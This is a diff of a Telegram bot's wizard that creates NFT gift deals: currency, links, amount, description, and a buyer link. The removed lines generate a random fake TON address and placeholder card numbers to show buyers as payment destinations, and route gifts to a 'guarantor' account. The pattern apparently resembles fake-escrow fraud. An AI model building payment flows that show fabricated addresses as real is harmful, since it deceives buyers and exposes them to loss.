@@ -1,37 +1,24 @@
 import { Scenes } from 'telegraf'
 import db from '../db.js'
 import { nanoid, customAlphabet } from 'nanoid'
-import { currencyKb, sellerGiftKb } from '../keyboards.js'
+import { currencyKb, sellerAwaitBuyerKb } from '../keyboards.js'
 
 const alphabet = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'
 const dealCode = customAlphabet(alphabet, 5)
 
-function now() {
-  return new Date().toLocaleString('ru-RU', { hour12: false })
-}
-function fakeTon() {
-  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'
-  let s = 'UQ'
-  for (let i = 0; i < 46; i++) s += alphabet[Math.floor(Math.random()*alphabet.length)]
-  return s
-}
-function detectRubType(val = '') {
-  const v = (val || '').replace(/\s+/g, '')
-  const looksLikeCard = /^\d{16,19}$/.test(v)
-  const looksLikePhone = /^(\+7|7|8)\d{10}$/.test(v)
-  return looksLikeCard ? 'card' : (looksLikePhone ? 'phone' : null)
-}
-
 export const createDealWizard = new Scenes.WizardScene(
   'create-deal',
 
+  // шаг 0 — выбрать валюту
   async (ctx) => {
     try { await ctx.deleteMessage() } catch {}
     ctx.wizard.state.data = { sellerId: ctx.from.id, nftLinks: [] }
-    await ctx.reply('Выберите валюту сделки:', currencyKb())
+    const msg = await ctx.reply('Выберите валюту сделки:', currencyKb())
+    ctx.wizard.state.data.lastMsgId = msg.message_id
     return ctx.wizard.next()
   },
 
+  // шаг 1 — собрать NFT-ссылки
   async (ctx) => {
     if (ctx.callbackQuery) {
       try { await ctx.answerCbQuery() } catch {}
@@ -39,79 +26,60 @@ export const createDealWizard = new Scenes.WizardScene(
     }
     const cb = ctx.callbackQuery?.data
     if (!cb?.startsWith('cur:')) return
-    const currency = cb.split(':')[1]
-    ctx.wizard.state.data.currency = currency
+    ctx.wizard.state.data.currency = cb.split(':')[1]
 
-    await ctx.reply(
+    const msg = await ctx.reply(
       'Вставьте ссылку на NFT подарок(и). Можно несколько — по одной.\n' +
       'Пример: https://t.me/nft/PlushPepe-2790\n\n' +
       'Когда закончите — напишите: ГОТОВО'
     )
+    ctx.wizard.state.data.lastMsgId = msg.message_id
     return ctx.wizard.next()
   },
 
+  // шаг 2 — сбор ссылок
   async (ctx) => {
     const t = (ctx.message?.text || '').trim()
     if (!t) return
     if (t.toLowerCase() === 'готово') {
-      await ctx.reply('Введите сумму сделки (число):')
+      const msg = await ctx.reply('Введите сумму сделки (число):')
+      ctx.wizard.state.data.lastMsgId = msg.message_id
       return ctx.wizard.next()
     }
     ctx.wizard.state.data.nftLinks.push(t)
-    await ctx.reply('✅ Принято! Ещё ссылку или напишите ГОТОВО.')
+    const msg = await ctx.reply('✅ Принято! Ещё ссылку или напишите ГОТОВО.')
+    ctx.wizard.state.data.lastMsgId = msg.message_id
   },
 
+  // шаг 3 — сумма
   async (ctx) => {
     const amount = Number((ctx.message?.text || '').replace(',','.'))
     if (!isFinite(amount) || amount <= 0) {
-      await ctx.reply('Введите корректное число.')
+      const msg = await ctx.reply('Введите корректное число.')
+      ctx.wizard.state.data.lastMsgId = msg.message_id
       return
     }
     ctx.wizard.state.data.amount = amount
-    await ctx.reply('Введите «суть сделки»:')
+    const msg = await ctx.reply('Введите «суть сделки»:')
+    ctx.wizard.state.data.lastMsgId = msg.message_id
     return ctx.wizard.next()
   },
 
+  // шаг 4 — финал: создаём сделку (ожидание покупателя)
   async (ctx) => {
     const d = ctx.wizard.state.data
     d.summary = (ctx.message?.text || '').trim()
     d.id = nanoid(10)
     d.code = dealCode()
     d.token = nanoid(8)
-    d.status = 'waiting_gift' // первый статус
+    d.status = 'await_buyer' // ⏳ ожидаем покупателя
     d.createdAt = Date.now()
-    d.log = [`${now()} — сделка создана; ожидание подарка гаранту @GiftSecureSupport`]
+    d.log = ['Сделка создана. Ожидаем покупателя.']
 
     await db.read()
     db.data.deals[d.id] = d
     await db.write()
 
-    const seller = db.data.users[d.sellerId] || {}
-    const w = seller.wallets || {}
-
-    let payLine = ''
-    if (d.currency === 'TON') {
-      const addr = w.TON || fakeTon()
-      payLine = `Покупателю будет показано: отправьте *${d.amount} TON* на адрес \`${addr}\`.`
-    } else if (d.currency === 'RUB') {
-      const rub = (w.RUB || '').trim()
-      const t = detectRubType(rub)
-      if (t === 'phone') {
-        payLine = `Покупателю будет показано: отправьте *${d.amount} RUB* на *номер телефона* \`${rub}\`.`
-      } else {
-        const card = rub || '2200 1234 5678 9012'
-        payLine = `Покупателю будет показано: отправьте *${d.amount} RUB* на *карту* \`${card}\`.`
-      }
-    } else if (d.currency === 'UAH') {
-      const card = (w.UAH || '5375 1234 5678 9012').trim()
-      payLine = `Покупателю будет показано: отправьте *${d.amount} UAH* на *карту* \`${card}\`.`
-    } else if (d.currency === 'STARS') {
-      payLine =
-        `Покупателю будет показано: оплатите *${d.amount} Stars* через *Fragment* ` +
-        `(https://fragment.com) или *подарками*. _Комиссия на покупателе._`
-    }
-
-    // диплинк
     let botName = process.env.BOT_USERNAME
     if (!botName) {
       try {
@@ -125,25 +93,16 @@ export const createDealWizard = new Scenes.WizardScene(
     try { await ctx.deleteMessage() } catch {}
 
     await ctx.reply(
-`✅ Сделка создана!
+`✅ Сделка создана. Ожидаем покупателя.
 
-🔖 Код: ${d.code}
 💰 Сумма: ${d.amount} ${d.currency}
 🧧 NFT:
 ${(d.nftLinks || []).join('\n')}
-
-📜 Описание: ${d.summary}
-
-🎁 Статус: *Ожидание подарка гаранту* @GiftSecureSupport
+🆔 Код: ${d.code}
 
 🔗 Ссылка для покупателя:
-${link}
-
-${payLine}
-
-Когда *отправите подарок гаранту*, нажмите «Подарок отправлен». 
-Затем — «Скриншот отправлен».`,
-      { parse_mode: 'Markdown', ...sellerGiftKb(d.token) }
+${link}`,
+      sellerAwaitBuyerKb(d.token)
     )
 
     return ctx.scene.leave()
